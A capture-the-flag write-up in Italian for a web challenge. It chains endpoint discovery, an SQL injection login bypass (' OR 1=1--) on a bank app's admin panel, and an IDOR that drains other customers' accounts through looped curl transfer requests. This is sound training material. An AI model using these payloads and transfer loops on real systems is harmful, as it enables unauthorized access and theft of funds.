# Your money are safe (bank)

**Competizione:** ITSCyberGame<br>
**Categoria:** Web<br>
**Servizio:** `sfide.itscybergame.it:<port_number>`<br>
**Credenziali fornite:** `user:luigi.pietrofossi` / `pass:v5RdMg5QgP`

---

## Descrizione

> OH NO! Il mio conto è in rosso, non so cosa fare T-T Aiutami a diventare ricco, voglio almeno 500.000 euro...

Viene fornita un'applicazione web bancaria con un conto in rosso (-10€). L'obiettivo è portare il saldo a 500.000€.

---

## Soluzione

### 1. Ricognizione iniziale

Dopo il login con le credenziali fornite, la pagina utente mostra:

- Saldo: **-10€**
- Form bonifico con campo `from` come `<input type="hidden">`
- Limite per bonifico: **5000€**
- Cookie di sessione Flask decodificabile: `{"is_admin": 0, "uid": "df101b73..."}`

Enumerando gli endpoint si scopre che `/admin` restituisce **302** invece di **404**:

```bash
curl -s -o /dev/null -w "%{http_code}" http://sfide.itscybergame.it:<port_number>/admin
# → 302
```

### 2. SQL Injection sul pannello admin

`/admin` espone un form di login separato. Testando i payload classici:

```bash
curl -s -X POST 'http://sfide.itscybergame.it:<port_number>/admin/login' \
  --data-urlencode "username=' OR 1=1--" \
  --data-urlencode "password=x" \
  -D -
```

```
HTTP/1.1 302 Found
location: /admin
set-cookie: session=eyJpc19hZG1pbiI6MSwidWlkIjo...
```

Il payload `' OR 1=1--` bypassa il controllo delle credenziali. Il cookie ottenuto contiene `is_admin: 1`.

### 3. IDOR — Trasferimento dai conti altrui

Con la sessione admin, il pannello `/admin` mostra la lista completa dei clienti:

| Username | Saldo |
|---|---|
| gianluca.william | 250.000€ |
| mario.rossi | 120.000€ |
| giulia.verdi | 80.000€ |
| giantiepolo.morralalunga | 60.000€ |
| luigi.pietrofossi | -10€ |

Con una sessione utente normale, il campo `from` del bonifico viene ignorato e il server usa sempre l'utente autenticato dalla sessione. Con la **sessione admin**, invece, il campo `from` viene rispettato, permettendo di disporre dei fondi di qualsiasi conto.

Exploit:

```bash
ADMIN_SESSION="<session_admin>"
BASE="http://sfide.itscybergame.it:<port_number>"

# gianluca.william → luigi (50 × 5000€)
for i in $(seq 1 50); do
  curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
    -X POST "${BASE}/transfer" \
    -d "from=gianluca.william&to=luigi.pietrofossi&amount=5000"
done

# mario.rossi → luigi (24 × 5000€)
for i in $(seq 1 24); do
  curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
    -X POST "${BASE}/transfer" \
    -d "from=mario.rossi&to=luigi.pietrofossi&amount=5000"
done

# giulia.verdi → luigi (16 × 5000€)
for i in $(seq 1 16); do
  curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
    -X POST "${BASE}/transfer" \
    -d "from=giulia.verdi&to=luigi.pietrofossi&amount=5000"
done

# giantiepolo.morralalunga → luigi (10 × 5000€)
for i in $(seq 1 10); do
  curl -s -o /dev/null -b "session=${ADMIN_SESSION}" \
    -X POST "${BASE}/transfer" \
    -d "from=giantiepolo.morralalunga&to=luigi.pietrofossi&amount=5000"
done
```

Saldo finale: **504.990€** → flag sbloccata.

---

## Flag

```
flag{...}
```

---

## Conclusioni

La challenge concatena tre vulnerabilità:

1. **Endpoint discovery**: il pannello `/admin` non era linkato nell'interfaccia utente ma era accessibile, bastava controllare robots.txt.

2. **SQL Injection**: il form `/admin/login` era vulnerabile a bypass classico (`' OR 1=1--`), permettendo l'accesso senza conoscere le credenziali reali dell'amministratore.

3. **IDOR (Insecure Direct Object Reference)**: con privilegi admin il campo `from` del bonifico non veniva più ignorato, consentendo di disporre dei fondi di qualsiasi conto senza ulteriori verifiche di autorizzazione.